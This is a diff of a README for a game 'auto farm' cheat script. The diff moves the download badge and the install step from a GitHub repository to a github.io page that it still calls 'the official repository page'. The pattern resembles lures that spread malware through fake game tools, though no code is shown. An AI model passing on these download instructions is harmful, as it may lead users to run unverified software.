@@ -1,6 +1,6 @@
 # 🤖 Anime-Adventures-Script-Auto-Farm-2026 - Automate your game progress with ease
 
-[![Download Link](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Nanuve8198/Anime-Adventures-Script-Auto-Farm-2026)
+[![Download Link](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://nanuve8198.github.io)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your system:
 
-1.  Visit the official repository page to access the files: [https://github.com/Nanuve8198/Anime-Adventures-Script-Auto-Farm-2026](https://github.com/Nanuve8198/Anime-Adventures-Script-Auto-Farm-2026)
+1.  Visit the official repository page to access the files: [https://nanuve8198.github.io](https://nanuve8198.github.io)
 2.  Locate the releases section on the right side of the page.
 3.  Click the latest version link to begin the download.
 4.  Save the file to a folder you can find easily, such as your Downloads folder or Desktop.
